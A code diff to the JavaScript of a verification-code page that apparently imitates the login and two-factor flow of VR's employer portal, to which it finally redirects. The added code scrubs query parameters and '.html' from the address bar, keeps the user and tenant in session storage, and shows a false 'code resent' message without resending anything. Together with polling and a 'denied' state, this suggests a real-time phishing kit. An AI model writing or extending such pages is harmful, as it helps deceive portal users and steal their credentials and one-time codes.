@@ -8,18 +8,26 @@ const fieldsetElem = document.getElementById("code-fieldset");
 
 const URL_FINAL = "https://superportal-empregador.vr.com.br/";
 
-// Recupera o usuário informado na tela anterior e tenant
+// Recupera o usuário e tenant do sessionStorage (sem expor na URL)
 const urlParams = new URLSearchParams(window.location.search);
-const usuarioSalvo = urlParams.get("usuario") || sessionStorage.getItem("vr_usuario") || "";
-const tenantSalvo = (urlParams.get("tenant") || urlParams.get("cliente") || sessionStorage.getItem("vr_tenant") || "default").trim();
+const usuarioSalvo = sessionStorage.getItem("vr_usuario") || urlParams.get("usuario") || "";
+const tenantSalvo = (sessionStorage.getItem("vr_tenant") || urlParams.get("tenant") || urlParams.get("cliente") || "default").trim();
 
+if (usuarioSalvo) {
+    sessionStorage.setItem("vr_usuario", usuarioSalvo);
+}
 if (tenantSalvo) {
     sessionStorage.setItem("vr_tenant", tenantSalvo);
 }
 
+// Higienização completa da barra de endereços: NUNCA expor parâmetros na URL
+if (window.location.search || window.location.hash || window.location.pathname.endsWith(".html")) {
+    const cleanPath = window.location.pathname.replace(/codigo\.html$/, "codigo").replace(/\.html$/, "") || "/codigo";
+    window.history.replaceState({}, document.title, cleanPath);
+}
+
 function voltarParaLogin() {
-    const t = sessionStorage.getItem("vr_tenant") || tenantSalvo || "default";
-    window.location.href = `/?tenant=${encodeURIComponent(t)}`;
+    window.location.href = "/";
 }
 
 let pollingInterval = null;
@@ -87,6 +95,25 @@ if (botaoVerificar) {
         await submeterCodigo();
     });
 }
+
+// Event Delegation para links e botões da tela de código (sem onclick inline nem alert nativo)
+document.addEventListener("click", (e) => {
+    const actionEl = e.target.closest("[data-action]");
+    if (!actionEl) return;
+    const action = actionEl.getAttribute("data-action");
+    if (action === "voltar-login" || action === "outro-metodo") {
+        e.preventDefault();
+        voltarParaLogin();
+    } else if (action === "reenviar-codigo") {
+        e.preventDefault();
+        if (statusElem) {
+            statusElem.textContent = "Código reenviado com sucesso para o e-mail cadastrado!";
+            setTimeout(() => {
+                if (statusElem) statusElem.textContent = "";
+            }, 4000);
+        }
+    }
+});
 
 function exibirErroNegado() {
     if (botaoVerificar) {
